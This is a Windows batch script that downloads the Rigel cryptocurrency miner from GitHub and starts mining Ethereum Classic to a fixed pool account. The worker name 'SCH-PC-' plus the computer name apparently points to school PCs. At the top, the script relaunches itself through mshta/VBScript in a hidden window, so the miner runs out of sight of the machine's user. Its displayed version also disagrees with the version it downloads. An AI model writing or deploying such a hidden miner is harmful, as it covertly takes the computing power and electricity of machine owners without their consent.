@echo off
setlocal enabledelayedexpansion

if "%1"=="h" goto begin
start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
:: 2. 解决部分win11/win10英文系统电脑打开为非正常中文字问题
:: 设置控制台代码页为UTF-8，确保中文正确显示
chcp 65001 >nul

:: 设置控制台窗口标题
title Rigel 1.22.3 Auto_Mining

:: 显示脚本标题和信息
echo.
echo ========================================
echo        Rigel Auto_Download&Mining
echo ========================================
echo Rigel版本: 1.22.3
echo ========================================
echo.

:: 设置固定版本号变量
set "VERSION=1.23.2"
echo [信息] 使用固定Rigel版本: %VERSION%
echo.

:: 设置下载URL和文件名变量
set "FILENAME=rigel-%VERSION%-win.zip"
set "DOWNLOAD_URL=https://github.com/rigelminer/rigel/releases/download/%VERSION%/%FILENAME%"

:: 检查文件是否已存在且大小正确
if exist "%FILENAME%" (
    echo [信息] 发现已存在的Rigel压缩包，检查文件大小...
    
    :: 获取文件大小（字节）
    for %%I in ("%FILENAME%") do set "FILESIZE=%%~zI"
    
    :: 检查文件大小是否在合理范围内（约52.8MB = 55,398,922字节）
    :: 允许一定范围的误差（52.5MB - 53MB）
    if !FILESIZE! GEQ 55050240 if !FILESIZE! LEQ 55574528 (
        echo [信息] 文件大小正确（约!FILESIZE!字节），跳过下载。
        goto :EXTRACT_Rigel
    ) else (
        echo [警告] 文件大小不正确（!FILESIZE!字节），可能需要重新下载。
        echo        预期大小：约52.8MB（55,398,922字节）
        echo.
        del /q "%FILENAME%" 2>nul
    )
)

:: 网络连通性检查 - 修复中文显示问题
echo [信息] 检查网络连通性...
ping -n 3 github.com >nul
if !errorlevel! neq 0 (
    echo [错误] 无法访问GitHub，请检查网络连接。
    echo        如果您在中国大陆，可能需要使用VPN或代理访问GitHub。
    echo        脚本无法继续执行。
    pause
    exit /b 1
)
echo [成功] 网络连通性正常，可以访问GitHub。
echo.

:: 尝试检测系统中是否已安装curl
echo [信息] 检查系统中是否已安装curl工具...
where curl >nul 2>nul
if !errorlevel! == 0 (
    echo [信息] 系统已安装curl工具。
    goto :DOWNLOAD_Rigel
)

echo [信息] 系统中未找到curl工具，尝试自动安装...
echo.

:: 创建临时目录来存放curl
set "TEMP_CURL_DIR=%TEMP%\curl_install"
if not exist "%TEMP_CURL_DIR%" (
    mkdir "%TEMP_CURL_DIR%"
)

:: 使用固定版本的curl下载链接
set "CURL_DOWNLOAD_URL=https://curl.se/windows/dl-8.8.0_5/curl-8.8.0_5-win64-mingw.zip"
set "CURL_ZIP=%TEMP_CURL_DIR%\curl.zip"

echo [信息] 正在下载curl...
:: 使用bitsadmin下载curl，因为此时可能还没有curl
bitsadmin /transfer downloadCurl /download /priority normal "%CURL_DOWNLOAD_URL%" "%CURL_ZIP%"

if not exist "%CURL_ZIP%" (
    echo [错误] 下载curl失败，请检查网络连接或手动安装curl。
    echo        curl官网：https://curl.se/windows/
    pause
    exit /b 1
)

:: 解压curl.zip
echo [信息] 正在解压curl...
powershell -command "Expand-Archive -Path '%CURL_ZIP%' -DestinationPath '%TEMP_CURL_DIR%' -Force"

:: 将解压后的curl二进制文件路径添加到当前会话的PATH环境变量中
for /d %%i in ("%TEMP_CURL_DIR%\curl-*") do (
    set "CURL_EXTRACTED_DIR=%%i"
)
set "PATH=%CURL_EXTRACTED_DIR%\bin;%PATH%"

:: 再次检查curl是否可用
where curl >nul 2>nul
if !errorlevel! neq 0 (
    echo [错误] 自动安装curl后仍无法找到curl命令。
    echo        请手动下载并安装curl
    pause
    exit /b 1
)

echo [成功] curl工具已临时安装并配置完成。
echo.

:DOWNLOAD_Rigel
:: 设置下载URL和文件名变量
set "FILENAME=rigel-%VERSION%-win.zip"
set "DOWNLOAD_URL=https://github.com/rigelminer/rigel/releases/download/%VERSION%/%FILENAME%"

:: 检查文件是否已存在
if exist "%FILENAME%" (
    echo [信息] 发现已存在的Rigel压缩包，跳过下载。
    goto :EXTRACT_Rigel
)

:: 下载Rigel
echo [信息] 正在下载Rigel: %FILENAME%
echo        如果下载速度慢，可能需要使用代理或VPN。
echo.

curl -L -o "%FILENAME%" "%DOWNLOAD_URL%"

if not exist "%FILENAME%" (
    echo [错误] Rigel下载失败。
    pause
    exit /b 1
)

echo [成功] 下载完成。
echo.

:EXTRACT_Rigel
:: 解压文件
echo [信息] 正在解压文件...
set "DIRNAME=rigel-%VERSION%-win"

:: 如果目录已存在，先删除
if exist "%DIRNAME%" (
    echo [信息] 发现已存在的目录，先删除...
    rmdir /s /q "%DIRNAME%"
)

powershell -command "Expand-Archive -Path '%FILENAME%' -DestinationPath . -Force"

if !errorlevel! neq 0 (
    echo [错误] 解压文件失败。
    pause
    exit /b 1
)

:: 获取当前计算机名作为矿工标识
set "RIG_NAME=SCH-PC-%COMPUTERNAME%"

:: 进入目录并运行Rigel
if exist "%DIRNAME%" (
    cd "%DIRNAME%"
    echo [成功] 已进入Rigel目录。
    echo.
    echo ========================================
    echo            Rigel 配置信息
    echo ========================================
    echo 矿池地址: etc.kryptex.network:8033
    echo 用户: qiuzhaojinting@gmail.com/%RIG_NAME%
    echo ========================================
    echo.
    echo [信息] 正在启动Rigel...
    echo        按Ctrl+C可停止挖矿程序。
    echo.
    
    :: 运行Rigel
    rigel.exe -a etchash -o stratum+ssl://etc.kryptex.network:8033 -u qiuzhaojinting@gmail.com/%RIG_NAME%
) else (
    echo [错误] 解压后的目录不存在: %DIRNAME%
    pause
    exit /b 1
)

:: 脚本结束
endlocal